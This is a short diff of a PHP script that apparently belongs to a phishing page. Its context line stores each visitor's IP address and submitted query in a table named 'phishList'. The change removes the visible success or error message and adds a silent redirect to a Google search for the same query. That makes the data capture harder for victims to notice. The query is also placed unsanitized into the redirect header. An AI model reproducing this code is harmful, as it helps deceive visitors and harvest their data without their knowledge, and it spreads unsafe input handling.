@@ -15,9 +15,7 @@ $sql = "INSERT INTO phishList (IP, query)
 
 $result = mysqli_query($conn, $sql);
 
-echo $result 
-    ? "✅ Data inserted successfully<br>"
-    : "❌ Error inserting data: " . mysqli_error($conn);
+header("Location: https://www.google.com/search?q=$query");
 
 mysqli_close($conn);
 ?>
